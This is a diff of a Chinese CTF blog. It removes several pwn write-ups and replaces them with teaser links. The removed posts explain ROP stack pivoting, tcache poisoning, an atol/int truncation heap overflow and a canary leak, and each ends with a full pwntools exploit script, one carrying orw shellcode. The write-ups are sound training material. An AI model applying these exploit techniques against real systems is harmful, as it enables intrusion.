-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>
-
-<p>通过对比下面两幅图，就可以发现输入前后，就把0xdeadbeef给覆盖成了pop_rdx_r12</p>
-<p><img src="/../img/image-20221007233216868.png" alt="image-20221007233216868"></p>
-<p><img src="/../img/image-20221007233231650.png" alt="image-20221007233231650"></p>
-<p>最后第一条链的第三部分（这部分是提前写好read的第一参数和第二个参数，但是第三个参数的位置，我用了0xdeadbeef来占位，因为在这条链的第二部分，read函数就将前两个0xdeadbeef覆盖成了pop_rdx_r12和0，这样第三条链实际上就是正常的了(第三个0xdeadbeef无所谓了，反正会被弹到r12寄存器里)）</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>
-
-<p>而执行完第一条链后，我们就可以在使用libc中任意gadget的前提下写入新的rop链。(如下图)<br><img src="/../img/image-20221007233251071.png" alt="image-20221007233251071"></p>
-<p>为了方便，我先去利用gadget传参且执行了mprotect函数，将这个内存页直接变成可读可写可执行了，最后跟了个orw的shellcode(最后orw这里有个坑，打远程不知道为啥，正常的orw在远程读不出来flag，而本地可以读出来。这里必须要先close(0)，然后再去打开flag文件，然后read从文件描述符0里读数据才行）</p>
-<p>调试过程如下：</p>
-<p><img src="/../img/image-20221007233305866.png" alt="image-20221007233305866"></p>
-<p>然后先用close把标准输入给关了，再打orw即可拿到flag</p>
-<p><img src="/../img/image-20221007233317473.png" alt="image-20221007233317473"></p>
-<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;app&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29916&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1464)</span></span><br><span class="line">payload=<span class="string">&quot;\x00\x00Nameless&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s check your identity\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here you are:&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base_addr=leak_addr-<span class="number">0x4050</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x00000000000014cd</span>+base_addr</span><br><span class="line">pop_rdi=<span class="number">0x00000000000014d3</span>+base_addr</span><br><span class="line">pop_rsi_r15=base_addr+<span class="number">0x00000000000014d1</span></span><br><span class="line">leave=base_addr+<span class="number">0x00000000000012d8</span></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;And pls write your own information on it\n&quot;</span>,rop)</span><br><span class="line">p.sendafter(<span class="string">&quot;Tell me your wish:\n&quot;</span>,p64(leak_addr-<span class="number">8</span>)+p64(leave))</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x111040</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">pop_rsi=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">pop_rdx_r12=<span class="number">0x11c1e1</span>+libc_base</span><br><span class="line">pop_rax=libc_base+<span class="number">0x4a550</span></span><br><span class="line">syscall=<span class="number">0x000000000002584d</span>+libc_base</span><br><span class="line">mprotect=<span class="number">0x000000000011b970</span>+libc_base</span><br><span class="line">rop=p64(pop_rdx_r12)+p64(<span class="number">0x1000</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line">pause()</span><br><span class="line">rop=p64(pop_rdi)+p64(leak_addr-<span class="number">0x50</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(base_addr+<span class="number">0x4150</span>)</span><br><span class="line">rop+=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x49\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x41\x50\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221007233330115.png" alt="image-20221007233330115"></p>
-<h2 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h2><h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007233338793.png" alt="image-20221007233338793"></p>
-<h3 id="漏洞所在：-2"><a href="#漏洞所在：-2" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>首先在show函数里程序自己泄露了一个libc地址。</p>
-<p><img src="/../img/image-20221007233346476.png" alt="image-20221007233346476"></p>
-<p>存在UAF漏洞：</p>
-<p><img src="/../img/image-20221007233356927.png" alt="image-20221007233356927"></p>
-<p>然后在申请堆块之后写入数据时会在用户区第三个内存单元开始输入数据(第一个内存单元用于存储一个size(如下)，第二个内存单元是空的)，但是输入的数据依然是malloc申请的size，这就意味着我们可以溢出下一个内存单元的prev_size和size位</p>
-<p><img src="/../img/image-20221007233404888.png" alt="image-20221007233404888"></p>
-<p><strong>而在delete函数中我们可以控制记录堆块的那个size(如下)，但恰巧这个位置是处于free状态的堆块的fd指针(这也是这道题的核心利用点)，因此我们可以在这里篡改堆块的fd指针</strong></p>
-<p><img src="/../img/image-20221007233412071.png" alt="image-20221007233412071"></p>
-<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>本题我们可以控制被释放掉堆块的fd指针，同时还有libc地址，那就可以直接打tcache poisoning。</p>
-<p>我们先申请四个堆块，分别为chunk1、chunk2、chunk3、chunk4（都申请size为0x50即可）</p>
-<p>在chunk3中存入malloc_hook-0x10的地址</p>
-<p>然后我们再将其全部释放掉，进入tcache bin。<strong>我们去修改一下chunk2的fd指针让其不指向chunk3的地址而去指向chunk3中存放的malloc_hook-0x10处，如此就劫持了tcache bin的这条链，最后申请出来在malloc_hook上写一个one_gadget的地址即可。</strong></p>
-<p>调试过程如下：</p>
-<p><img src="/../img/image-20221007233430592.png" alt="image-20221007233430592"></p>
-<p><img src="/../img/image-20221007233448315.png" alt="image-20221007233448315"></p>
-<p>为什么当时打tcache poisoning的时候，需要让malloc_hook的地址-0x10（原因如下），<strong>因为数据是从用户区+0x10的位置开始写入的，因此申请的时候需要提前-0x10.</strong></p>
-<p><img src="/../img/image-20221007233458822.png" alt="image-20221007233458822"></p>
-<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16D5</span></span><br><span class="line">d_a=<span class="number">0x16C1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">wine,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Whisky , brandy or Vodka?&quot;</span>, <span class="built_in">str</span>(wine))</span><br><span class="line">    p.sendafter(<span class="string">&quot;You may want to tell sth to the waiter:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much?&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;We will give everyone only one cup of icecream!\n&quot;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_libc_addr-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]<span class="comment">#-0x1ed6a0+0x1000 #</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a)</span><br><span class="line">delete(<span class="number">2</span>,-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a)</span></span><br><span class="line">add(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/../img/image-20221007233511947.png" alt="image-20221007233511947"></p>
-<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007233524690.png" alt="image-20221007233524690"></p>
-<h3 id="漏洞所在：-3"><a href="#漏洞所在：-3" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>在add函数里的输入函数中，最后用atol函数对buf做了处理(如下图)</p>
-<p><img src="/../img/image-20221007233539574.png" alt="image-20221007233539574"></p>
-<p>而atol函数是将字符串转换成一个长整数(long int类型)，跟这个函数很像的还有一个atoi函数，该函数是将字符串转换成一个整数(int类型)，多亏了<a target="_blank" rel="noopener" href="https://survive2.github.io/">h1J4cker师傅</a>给我说了一下，以前还真没注意过这俩函数的区别。</p>
-<p>而这道题的漏洞也在此，atol函数返回的是long int类型，可之后if在进行检查的时候却强转成了Int类型。</p>
-<p><img src="/../img/image-20221007233557237.png" alt="image-20221007233557237"></p>
-<p>就导致了这里输入一个大数可以绕过这个检查。</p>
-<p>举个例子我们输入4294967440，这个数字转换成二进制如下(int类型为4字节，最高比特位为符号位)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0001     0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如果是long int类型，则这个数字就是正常的。但如果是强转成Int类型，那么会舍弃4字节之外的比特位(从右往左数32比特)，这样其实在判断的时候这个数字就成了144(如下)，从而绕过了检查。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可是最终往堆块里输入的数据又没有进行int强转，这样我们实际写入的就是那个大数4294967440，从而导致了堆溢出。</p>
-<p><img src="/../img/image-20221007233639073.png"></p>
-<h3 id="利用思路：-3"><a href="#利用思路：-3" class="headerlink" title="利用思路："></a>利用思路：</h3><p>不过本题中除了上述漏洞外不存在任何漏洞，就导致了我们想要泄露libc地址只能打一个堆块重叠让unsorted bin的fd和bk指针落在使用状态中的堆块上，然后将其打印出来。</p>
-<p>具体实现过程如下:</p>
-<p>1、先申请出来十个堆块，依次命名为chunk1，chunk2，chunk3…chunk10</p>
-<p>2、我们将后七个堆块(chunk4-chunk10)全部释放掉</p>
-<p>3、再将前三个堆块(chunk1、chunk2、chunk3)给释放掉，此时这三个堆块就会全部进入到unsorted bin中，而之后的tcache bin中的7个堆块则填满tcache bin同时还防止了前三个进入unsorted bin中的堆块与top chunk合并</p>
-<p>4、再将在tcachebin中的七个堆块给申请出来，需要注意的是我们在申请第六个堆块的时候要去写入一个伪造的prev_size和size保证之后可以顺利的从unsorted bin中取出堆块。(此时的情况如下)</p>
-<p><img src="/../img/image-20221007233701615.png" alt="image-20221007233701615"></p>
-<p>5、接下来我们申请堆块时，size写成一个大数，造成溢出来篡改unsorted bin的size。(篡改后如下)</p>
-<p><img src="/../img/image-20221007233720390.png" alt="image-20221007233720390"></p>
-<p>6、我们申请一个特定大小的堆块让更新后的unsorted bin的fd和bk指针正好落在一个正在使用的堆块用户区。(如下图)</p>
-<p><img src="/../img/image-20221007233736715.png" alt="image-20221007233736715"></p>
-<p>7、打印索引为6的堆块，就可以进行泄露libc地址</p>
-<p>8、最后打一个tcache poisoing劫持tcache bin的fd指针将free_hook申请出来，释放掉一个存有&#x2F;bin&#x2F;sh字符串的堆块即可获取shell</p>
-<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16BB</span></span><br><span class="line">d_a=<span class="number">0x16A9</span></span><br><span class="line">d_s=<span class="number">0x16CD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1.Add note\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0x200</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4294967424</span>,<span class="string">b&#x27;u&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x201</span>)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x140</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ebbe0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4294967424</span>+<span class="number">16</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221007233750427.png" alt="image-20221007233750427"></p>
-
+          <p>赛题WP</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/da4f7b20.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1455,7 +759,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-12-12 21:08:40" itemprop="dateModified" datetime="2022-12-12T21:08:40+08:00">2022-12-12</time>
+      <time title="修改时间：2023-07-01 19:58:24" itemprop="dateModified" datetime="2023-07-01T19:58:24+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1477,24 +781,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011047418.png" alt="image-20221201104720121"></p>
-<p>没开NX，但是对于本题来说没啥用，因为程序给了后门函数</p>
-<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011048486.png" alt="image-20221201104846427"></p>
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011052461.png" alt="image-20221201105203859"></p>
-<p>最初这里有个输入的地方存在off by one漏洞，结合到下面的%s输出考虑到可能是泄露数据，发现写入的地方紧挨canary，因此这里将canary泄露出来。</p>
-<p>而后程序给了两个功能，一个是申请出来一个0x20的堆块，在向堆块里输入数据的时候存在一个漏洞。</p>
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011058480.png" alt="image-20221201105840410"></p>
-<p>上面的这个a2可控，将其置成0。这样判断就是v5&lt;&#x3D;-1，而v5是无符号整形因此在判断的时候-1也会转成无符号整形，也就是0xffffffff，从而导致了堆溢出。</p>
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011101525.png" alt="image-20221201110128458"></p>
-<p>另一个函数是进行了三个判断，如果全部通过的话则触发后门函数。</p>
-<p>正常来说的话是无论如何也不会通过检查的，因为在第三个检查的地方是在拿堆块里的数据与canary做比较，但是正常来说申请完堆块第一个内存单元是0x00000886,这样跟canary比较是不可能通过的。</p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>但是赋值为0x886的时候发现有个判断，如下</p>
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011105526.png" alt="image-20221201110531488"></p>
-<p>也就是说如果申请的堆块本身在v2的位置就有数据，那么就不会对v2再进行赋值了，联想到上面提到的堆溢出，利用思路就是直接溢出top chunk,不改变其size，但是在其用户区提前布置好canary，这样下次申请的新堆块在v2的位置本身就有数据了，从而通过最后的检查。</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn_5&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25028&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">9</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;power length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;data: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0xc</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x20d51</span>)+p64(canary)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,p64(canary)[<span class="number">4</span>:])</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x17E3</span>,<span class="number">0x181E</span>,<span class="number">0x182A</span>,<span class="number">0x168F</span>)  </span><br><span class="line">cmp(p64(canary)[<span class="number">4</span>:])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011110205.png" alt="image-20221201111058054"></p>
-
+          <p>赛题WP</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/ffd20e6e.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1556,7 +851,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 20:00:04" itemprop="dateModified" datetime="2023-07-01T20:00:04+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1578,27 +873,199 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220906222410458-1956148377.png"></p>
-<h2 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h2><p><img src="/../img/2706180-20220906222419536-1535739468.png"></p>
-<p>在edit函数中存在一个off by null漏洞。</p>
-<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/../img/2706180-20220906222442298-1594138131.png"></p>
-<p>在add函数中，对malloc申请的内存大小做了限制，需要小于0x100并且大于0x7f的堆块才行，然后索引我们可以使用0到31(32没法用，因为这里的len[32]和heap[0]是一个内存单元，如果用了32，那么len[32]就有数据了，到了申请索引为0号堆块的时候，heap[0]有内容，就会进入if程序退出)</p>
-<p>edit函数中存在一个off by null，并且有个key1的限制，导致了edit函数只能执行两次。</p>
-<p>show函数表面感觉能使用，但是key2在bss段，默认值为0，所以show函数我们无法正常使用(如下图)</p>
-<p><img src="/../img/2706180-20220906222455658-560983424.png"></p>
-<p>delete函数可以无限次使用，但是不存在漏洞。</p>
-<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>程序的libc版本为2.29,我们常规打一个off by null做一个堆块重叠，但是由于我们无法直接释放掉堆块让其进入unsorted bin(而off by null做的堆块合并需要让堆块位于unsorted bin中)，所以在这之前我们需要tcachebin中填满堆块(不必担心索引的问题，我们有32个索引可以用，同时delete函数还可以清空索引中内容)</p>
-<p>然后打一个off by null，此时的堆块布局应该如下：</p>
-<p>这个merge chunk的prev size被修改为了0x200  (merged chunk之所以可以进入unsorted bin中是因为在这之前tcahce bin中已经装了七个chunk了)</p>
-<p><img src="/../img/2706180-20220906222534768-1045740973.png"></p>
-<p>然后我们释放掉merge chunk，触发合并，打一个堆块重叠，然后做一个double free出来。接着打tcache poisoning,我们去将堆块的fd指针去修改为0x6021d0这个地址，因为这个地址既属于我们的heap指针数组，同时加上0xf0后还可以去修改key1和key2。</p>
-<p>(其实这道题看见key这个名字同时联想下key1和key2的作用，很容易想到去篡改这两个值，不然edit用不了，我们之后的各种手法都会失效，而修改key2还可以使用show函数)，但如果仅仅是修改key值的话，就导致了我们之后还要再打一遍off by null，但是0xf0这个链已经成-1坏掉了，应该就没法利用了(我没有仔细考虑这种方法，但是我试了下，这0xf0链坏掉之后，off by null就没法再打一次了，如果最开始做三个相同的堆块地址，保证0xf0的这个链不会在第一次打个double free就坏掉，应该也可以利用(但是我没有试，这只是我的一个思路))</p>
